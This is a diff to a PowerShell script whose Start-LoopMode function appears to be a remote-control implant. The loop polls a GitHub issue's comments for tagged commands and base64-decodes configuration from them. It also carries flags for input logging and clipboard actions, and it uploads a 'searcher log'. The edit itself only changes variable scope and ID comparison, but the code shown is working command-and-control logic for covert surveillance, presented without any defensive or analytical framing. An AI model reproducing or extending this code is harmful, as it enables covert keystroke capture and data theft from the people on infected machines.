@@ -151,6 +151,8 @@ function Start-LoopMode
     $enableInputLogging = $True
     $enableClipboardActions = $False
 
+    $script:mostRecentConfigurationCommandID = 0
+
     While($True)
     {
         #Post heartbeat message.
@@ -172,11 +174,11 @@ function Start-LoopMode
         try
         {
             Write-Console -Message ("Fetching all comments for this machine...")
-            $comments = Get-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue
-            If((($comments).length) -gt 2)
+            $script:comments = Get-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue
+            If((($script:comments).length) -gt 2)
             {
                 Write-Console -Message ("Reversing array...")
-                [array]::Reverse($comments)
+                [array]::Reverse($script:comments)
                 Write-Console -Message ("Reversed.")
             }
             Else 
@@ -196,7 +198,7 @@ function Start-LoopMode
         $script:mostRecentConfigurationCommandID = 0
         try 
         {
-            ForEach($comment in $comments)
+            ForEach($comment in $script:comments)
             {
                 If(($comment.body).IndexOf('[1]') -ne -1)
                 {
@@ -218,9 +220,9 @@ function Start-LoopMode
         {
             If(!($script:mostRecentConfigurationCommandID -eq 0))
             {
-                ForEach($comment in $comments)
+                ForEach($comment in $script:comments)
                 {
-                    If($comment.ID -eq $script:mostRecentConfigurationCommandID)
+                    If([int]$comment.ID -eq [int]$script:mostRecentConfigurationCommandID)
                     {
                         $configurationString = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String(($comment.body).replace("[1]:","")))
                         Write-Console -Message ("Decoded the configuration string. It appears to be " + $configurationString)
@@ -365,7 +367,7 @@ function Start-LoopMode
         #Refresh comments, but don't reverse them. Oldest comments will be processed first.
         try
         {
-            $comments = Get-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue
+            $script:comments = Get-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue
         }
         catch 
         {
@@ -377,7 +379,7 @@ function Start-LoopMode
         #Process all commands.
         try 
         {
-            ForEach($comment in $comments)
+            ForEach($comment in $script:comments)
             {
                 #Refresh and upload searcher log
                 If(($comment.body).IndexOf('[7]') -ne -1)
